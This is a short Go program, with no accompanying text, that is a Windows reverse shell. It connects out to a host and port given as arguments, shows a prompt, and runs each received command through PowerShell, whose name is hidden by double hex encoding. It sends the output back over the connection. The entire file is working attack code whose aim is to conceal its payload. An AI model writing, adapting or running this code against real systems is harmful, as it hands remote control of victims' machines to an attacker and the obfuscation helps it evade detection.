package main

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

func main() {

	p, _ := strconv.ParseInt(os.Args[2], 10, 0)

	c, e := net.Dial("tcp4", fmt.Sprintf("%s:%d", os.Args[1], p))

	if e != nil && c != nil {
		c.Close()
	}

	for {

		c.Write([]byte("$ "))
		m, _ := bufio.NewReader(c).ReadString('\n')
		m = strings.TrimSuffix(m, "\n")
		d := strings.Split(m, " ")

		switch d[0] {

		case "exit":
			c.Close()
			os.Exit(0)

		default:
			t, _ := hex.DecodeString("3730366637373635373237333638363536633663")
			t, _ = hex.DecodeString(string(t))
			o, _ := exec.Command(string(t), "/C", m).CombinedOutput()
			c.Write(o)
		}
	}
}
